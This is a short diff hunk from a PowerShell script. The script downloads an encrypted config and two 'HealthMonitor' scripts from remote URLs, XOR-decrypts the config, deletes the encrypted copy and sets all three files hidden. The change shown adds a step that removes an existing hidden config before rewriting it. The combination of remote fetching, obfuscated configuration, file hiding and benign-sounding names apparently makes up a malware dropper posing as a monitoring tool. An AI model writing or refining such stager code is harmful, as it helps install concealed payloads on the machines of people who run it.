@@ -7,7 +7,7 @@ if(!(Test-Path $p)){New-Item -Path $p -ItemType Directory -Force|Out-Null};(Get-
 Invoke-WebRequest -Uri $eu -OutFile "$p\config.enc" -UseBasicParsing
 Invoke-WebRequest -Uri $uu -OutFile "$p\HealthMonitor.ps1" -UseBasicParsing
 Invoke-WebRequest -Uri $au -OutFile "$p\HealthMonitorAdmin.ps1" -UseBasicParsing
-$enc=[Convert]::FromBase64String((Get-Content "$p\config.enc" -Raw));$kb=[System.Text.Encoding]::UTF8.GetBytes($ek);$dec=New-Object byte[] $enc.Length;for($i=0;$i -lt $enc.Length;$i++){$dec[$i]=$enc[$i] -bxor $kb[$i % $kb.Length]};[System.Text.Encoding]::UTF8.GetString($dec)|Out-File "$p\config.json" -Force
+$enc=[Convert]::FromBase64String((Get-Content "$p\config.enc" -Raw));$kb=[System.Text.Encoding]::UTF8.GetBytes($ek);$dec=New-Object byte[] $enc.Length;for($i=0;$i -lt $enc.Length;$i++){$dec[$i]=$enc[$i] -bxor $kb[$i % $kb.Length]};if(Test-Path "$p\config.json"){attrib -h "$p\config.json";Remove-Item "$p\config.json" -Force};[System.Text.Encoding]::UTF8.GetString($dec)|Out-File "$p\config.json" -Force -Encoding UTF8
 Remove-Item "$p\config.enc" -Force
 (Get-Item "$p\config.json").Attributes="Hidden";(Get-Item "$p\HealthMonitor.ps1").Attributes="Hidden";(Get-Item "$p\HealthMonitorAdmin.ps1").Attributes="Hidden"
 
